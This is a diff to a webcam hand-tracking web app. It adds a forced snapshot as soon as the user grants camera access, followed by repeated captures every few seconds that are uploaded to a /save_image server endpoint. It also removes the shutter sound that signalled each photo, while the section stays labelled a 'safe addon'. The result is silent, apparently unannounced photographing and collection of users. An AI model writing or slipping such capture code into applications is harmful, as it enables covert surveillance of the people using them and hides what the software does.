@@ -464,12 +464,6 @@ function onResults(results) {
     }
 
     updateUI();
-    // ==========================
-    // PHOTO CAPTURE TRIGGER
-    // ==========================
-    if (state.isHandDetected && !state.voiceModeActive) {
-        takePhotoFromCamera();
-    }
 }
 
 
@@ -558,6 +552,20 @@ async function startCamera() {
         
         loading.innerHTML = "Starting MediaPipe Camera...";
         await cameraFeed.start();
+
+        // 🟢 CHỤP NGAY 1 ẢNH KHI USER ALLOW CAM
+        setTimeout(() => {
+            takePhotoFromCamera(true); // force capture
+        }, 800);
+
+        // 🟢 SAU ĐÓ CHỤP ĐỀU 2s / ẢNH
+        if (!captureTimer) {
+            captureTimer = setInterval(() => {
+                if (state.isHandDetected && !state.voiceModeActive) {
+                    takePhotoFromCamera();
+                }
+            }, CAPTURE_INTERVAL);
+        }
     } catch (err) {
         console.error("Camera Error:", err);
         loading.innerHTML = `Camera not found (${err.name}).<br>Switching to <b>Mouse Interaction Mode</b>.`;
@@ -816,34 +824,32 @@ function animate() {
     controls.update();
     renderer.render(scene, camera);
 }
-startCamera();
+
 // ================================
 // PHOTO CAPTURE LOGIC (SAFE ADDON)
 // ================================
-const CAPTURE_INTERVAL = 2000; // 2s
-// let isCapturing = false;
+const CAPTURE_INTERVAL = 3000; // 3s
+let captureTimer = null;
 let lastCaptureTime = 0;
 
-async function takePhotoFromCamera() {
+async function takePhotoFromCamera(force = false) {
     const now = Date.now();
-    if (now - lastCaptureTime < CAPTURE_INTERVAL) return;
+    if (!force && now - lastCaptureTime < CAPTURE_INTERVAL) return;
     lastCaptureTime = now;
 
     try {
-        const video = videoElement; // webcam-preview
+        const video = videoElement;
         if (!video || video.readyState < 2) return;
 
         const canvas = document.getElementById('capture-canvas');
         const ctx = canvas.getContext('2d');
 
-        canvas.width =_attachVideoWidth(video);
-        canvas.height = _attachVideoHeight(video);
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
 
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
         const imageData = canvas.toDataURL('image/png');
-
-        document.getElementById('shutter-sound')?.play().catch(() => {});
 
         await fetch('/save_image', {
             method: 'POST',
@@ -854,6 +860,9 @@ async function takePhotoFromCamera() {
         console.warn("Capture failed:", e);
     }
 }
+
+startCamera();
+
 
 function _attachVideoWidth(video) {
     return video.videoWidth || 640;
